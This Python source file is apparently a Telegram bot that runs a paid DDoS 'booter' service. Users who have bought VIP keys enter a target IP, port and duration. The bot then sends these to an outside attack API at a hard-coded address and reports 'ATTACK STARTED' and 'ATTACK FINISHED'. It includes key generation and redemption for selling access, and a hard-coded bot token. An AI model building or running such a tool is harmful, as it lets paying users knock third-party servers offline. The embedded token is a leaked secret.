import telebot
import time
import json
import random
import string
import os
import threading
import requests
from flask import Flask
from telebot import types

# --- FLASK SERVER FOR RAILWAY ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is Running!"

def run_web():
    # Railway provides a dynamic PORT, we must use it
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

# --- CONFIGURATION ---
TOKEN = "8749691844:AAE36-_kLbm7H5XlPtXSTn-0liXRAQF9x-c"
ADMIN_ID = 8787952549
API_URL = "http://13.203.155.253/attack"

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")

# --- GLOBAL TRACKING ---
running_attacks = 0 
active_attack_details = [] 

# --- DATABASE SYSTEM ---
def load_data(file, default):
    if os.path.exists(file):
        try:
            with open(file, "r") as f: return json.load(f)
        except: return default
    return default

def save_data(file, data):
    with open(file, "w") as f: json.dump(data, f, indent=4)

users = load_data("users.json", {})
keys = load_data("keys.json", {})

# --- START COMMAND ---
@bot.message_handler(commands=['start'])
def start(message):
    uid = str(message.from_user.id)
    if uid not in users:
        users[uid] = {"expiry": 0, "plan": "FREE", "name": message.from_user.first_name}
        save_data("users.json", users)
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 ATTACK", "👤 PROFILE", "🎫 REDEEM", "📜 HELP")

    welcome = (
        f"🔥 **SASTA DEVELOPER TERMINAL** 🔥\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 **User:** `{message.from_user.first_name}`\n"
        f"💳 **Rank:** `{'ADMIN' if int(uid) == ADMIN_ID else 'VIP' if users[uid]['expiry'] > time.time() else 'FREE'}`\n"
        f"🛰️ **Server:** `Railway Optimized`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(message.chat.id, welcome, reply_markup=markup)

# --- ATTACK SYSTEM (LIMIT: 2 CONCURRENT) ---
@bot.message_handler(func=lambda m: m.text == "🚀 ATTACK")
def attack_request(message):
    global running_attacks
    uid = str(message.from_user.id)
    
    if users.get(uid, {}).get('expiry', 0) < time.time() and int(uid) != ADMIN_ID:
        bot.reply_to(message, "🚫 **ACCESS DENIED!** Buy VIP."); return
    
    if running_attacks >= 2 and int(uid) != ADMIN_ID:
        bot.reply_to(message, "⚠️ **SYSTEM BUSY!**"); return
    
    msg = bot.send_message(message.chat.id, "🎯 **Enter Target:** `IP PORT TIME`")
    bot.register_next_step_handler(msg, run_attack)

def run_attack(message):
    global running_attacks
    try:
        ip, port, duration = message.text.split()
        duration_int = int(duration)
        
        running_attacks += 1
        attack_info = {"target": f"{ip}:{port}", "user": message.from_user.first_name, "end": int(time.time()) + duration_int}
        active_attack_details.append(attack_info)

        sent = bot.send_message(message.chat.id, "🚀 **Injecting Packets...**")
        
        def call_api_and_wait():
            global running_attacks
            headers = {"User-Agent": "Mozilla/5.0"}
            full_url = f"{API_URL}?ip={ip}&port={port}&time={duration}&key=DESTRUCTED"
            
            try: requests.get(full_url, headers=headers, timeout=10)
            except: pass
            
            bot.edit_message_text(f"🔥 **ATTACK STARTED**\n🎯 **Target:** `{ip}:{port}`\n⏳ **Time:** `{duration}s`", message.chat.id, sent.message_id)
            time.sleep(duration_int)
            
            running_attacks -= 1
            if attack_info in active_attack_details: active_attack_details.remove(attack_info)
            bot.send_message(message.chat.id, f"✅ **ATTACK FINISHED**\n🎯 `{ip}:{port}`")

        threading.Thread(target=call_api_and_wait).start()
    except:
        bot.reply_to(message, "❌ **Format Error!**")

# --- ADMIN TOOLS ---
@bot.message_handler(commands=['genkey'])
def genkey(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        days = int(message.text.split()[1])
        key = "SD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
        keys[key] = days * 86400
        save_data("keys.json", keys)
        bot.reply_to(message, f"🎫 **Key:** `{key}`")
    except: bot.reply_to(message, "❌ `/genkey <days>`")

@bot.message_handler(func=lambda m: m.text == "🎫 REDEEM")
def redeem_key(message):
    msg = bot.send_message(message.chat.id, "⌨️ **Enter Key:**")
    bot.register_next_step_handler(msg, process_redeem)

def process_redeem(message):
    uid = str(message.from_user.id)
    key = message.text.strip()
    if key in keys:
        duration = keys.pop(key)
        users[uid]['expiry'] = max(users[uid].get('expiry', 0), time.time()) + duration
        save_data("users.json", users)
        save_data("keys.json", keys)
        bot.send_message(message.chat.id, "✅ **VIP ACTIVATED!**")
    else: bot.send_message(message.chat.id, "❌ **Invalid Key!**")

# --- MAIN EXECUTION ---
if __name__ == "__main__":
    # Start Web Server for Railway Health Check
    threading.Thread(target=run_web).start()
    print(">>> Sasta Developer Railway Bot Live!")
    bot.infinity_polling(skip_pending=True)
